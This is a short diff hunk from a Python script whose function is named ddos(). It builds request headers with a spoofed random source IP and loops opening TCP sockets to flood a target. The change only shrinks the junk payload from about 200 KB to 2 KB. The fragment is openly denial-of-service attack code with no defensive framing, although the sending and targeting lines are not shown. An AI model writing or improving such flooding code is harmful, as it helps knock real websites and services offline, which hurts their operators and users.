@@ -102,7 +102,7 @@ def ddos():
     header = get_host + referer + forward + accept + up + content + connection +  length + "\r\n\r\n"
     randomip = str(random.randint(1,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "\r\n"
     request = get_host + forward + connection + accept + up + forwards + header + length + randomip + referer + content + "\r\n"
-    data = (random._urandom(200048))
+    data = (random._urandom(2000))
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
